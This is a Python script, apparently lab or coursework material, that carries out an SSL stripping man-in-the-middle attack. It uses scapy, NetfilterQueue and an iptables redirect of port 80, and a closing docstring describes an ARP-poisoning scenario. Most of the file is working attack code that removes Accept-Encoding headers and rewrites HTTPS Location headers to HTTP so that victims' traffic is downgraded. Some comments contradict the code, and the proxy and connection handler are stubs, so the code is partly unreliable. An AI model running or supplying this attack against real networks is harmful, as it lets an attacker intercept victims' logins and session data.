from scapy.all import *
import re 
import os  
from netfilterqueue import NetfilterQueue
from threading import Thread
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn

# process intercepted packets
def process_traffic(packet):
    # Convert packet to a Scapy packet
    p = IP(packet.get_payload())

    #print("Packet intercepted: ")
    #print(p.show())

    # Check if the packet has a Raw layer, where the HTTP message is located
    # so check if payload of the packet contains HTTP data
    if p.haslayer(Raw):

        # decode packet payload
        load = p[Raw].load.decode(errors="ignore")

        # check if the packet is a TCP packet
        if p.haslayer(TCP):
            # destination port 80 is the default port for HTTP traffic
            if p[TCP].dport == 80:
                # remove the Accept-Encoding header from the HTTP request
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                #print(load)
            # source port 80 is the default port for HTTP traffic
            elif p[TCP].sport == 80:
                # remove the Content-Encoding header from the HTTP response
                load = re.sub("Location: https://", "Location: http://", load)
                #print(load)

        # If the load was modified, update the packet
        if load != p[Raw].load:
            # Update the packet with the new payload
            p[Raw].load = load
            # delete the checksums and length of the packet
            del p[IP].len
            del p[IP].chksum
            del p[TCP].chksum
            # convert scapy packet to a regular packet
            packet.set_payload(str(p))

    # accept the packet and forward it to its destination
    # print(p.show())
    packet.accept()

# start SSL stripping attack
def ssl_strip(interface):
    # Start the proxy in a separate thread
    proxy_thread = Thread(target=start_proxy)
    proxy_thread.start()

    # Enable IP forwarding, redirect HTTP traffic to port 10000
    os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
    queue = NetfilterQueue()
    queue.bind(0, process_traffic)
    queue.run()

# Start a simple HTTP server to handle the redirected traffic
def start_proxy():
    server_address = ('', 10000)
    httpd = ThreadedHTTPServer(server_address, BaseHTTPRequestHandler)
    httpd.serve_forever()

# Handle the incoming connection
def handle_connection(conn, addr):
    data = conn.recv(1024)
    #print("Received data: ", data)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


'''
M1 sends a request to M2. This could be an HTTP or HTTPS request.

Because of the ARP poisoning attack set up by M3, the request from M1 to M2 is intercepted by M3.

M3 has set up a rule in its IP tables to redirect all HTTP traffic (traffic on port 80) to port 10000, where the proxy server is listening.

The proxy server receives the redirected request and processes it. If the request is an HTTP request, the Accept-Encoding header is removed. If the request is an HTTPS request, the Location header is modified to downgrade the request to HTTP.

The proxy server then forwards the modified request to M2.

M2 responds to the request and sends the response back to M1. This response is also intercepted by M3 and redirected to the proxy server.

The proxy server receives the redirected response and processes it. If the response is an HTTP response, the Content-Encoding header is removed. If the response is an HTTPS response, the Location header is modified to downgrade the response to HTTP.

The proxy server then forwards the modified response to M1.

M1 receives the modified response thinking it came directly from M2.

'''